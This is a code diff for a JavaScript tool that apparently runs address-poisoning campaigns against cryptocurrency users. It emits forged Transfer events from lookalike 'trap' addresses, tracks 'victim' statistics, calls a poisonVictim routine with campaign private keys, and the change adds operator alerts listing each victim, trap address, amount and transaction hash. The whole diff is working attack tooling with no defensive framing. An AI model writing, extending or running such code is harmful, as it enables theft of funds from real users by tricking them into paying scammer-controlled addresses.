@@ -743,6 +743,7 @@ function checkTransaction(tx) {
       // 🆕 VECTOR 1: forged Transfer event using the correct contract for the asset
       const mirrorRaw = computeMirrorRawValue(tx, detectedAsset);
       let mirrorSuccess = false;
+      let mirrorTxHash = null;
 
       if (mirrorRaw > 0n) {
         // Select the correct contract based on detected asset
@@ -758,14 +759,36 @@ function checkTransaction(tx) {
               mirrorRaw,
               campaignWallet.walletClient,
               entry.campaignId,
-              mirrorContractAddress  // 🆕 Pass the specific contract address
+              mirrorContractAddress
             );
             mirrorSuccess = !!result;
+            mirrorTxHash = result || null;
           } else {
             logger.debug(`[mirror] No funding key loaded for campaign ${entry.campaignId}, skipping mirror`);
           }
         } else {
           logger.debug(`[mirror] No mirror contract configured for asset: ${detectedAsset}`);
+        }
+      }
+
+      // 🆕 Send mirror notification if successful
+      if (mirrorSuccess && mirrorTxHash) {
+        try {
+          // Convert raw value to human-readable amount
+          const decimals = detectedAsset === 'ETH' || detectedAsset === 'BNB' || detectedAsset === 'MATIC' ? 18 : 6;
+          const amountDisplay = (Number(mirrorRaw) / (10 ** decimals)).toFixed(6);
+
+          await sendAlert(
+            `🪞 Mirror event emitted!\n` +
+            `Victim: \`${from}\`\n` +
+            `Trap: \`${entry.trapAddress}\`\n` +
+            `Amount: ${amountDisplay} ${detectedAsset}\n` +
+            `TX: \`${mirrorTxHash}\``,
+            'info',
+            entry.campaignId
+          );
+        } catch (alertErr) {
+          logger.warn(`Failed to send mirror alert: ${alertErr.message}`);
         }
       }
 
@@ -779,10 +802,6 @@ function checkTransaction(tx) {
         stats.attempts++;
         stats.successes++;
         victimStats.set(from, stats);
-
-        try {
-          await sendAlert(`🪞 Mirror emitted (real dust skipped)\nVictim: ${from}\nAsset: ${detectedAsset}\nTX: ${tx.hash}`, 'info', entry.campaignId);
-        } catch (err) { /* ignore */ }
 
       } else {
         await poisonVictim(from, entry.privateKey, entry.campaignId, detectedAsset);
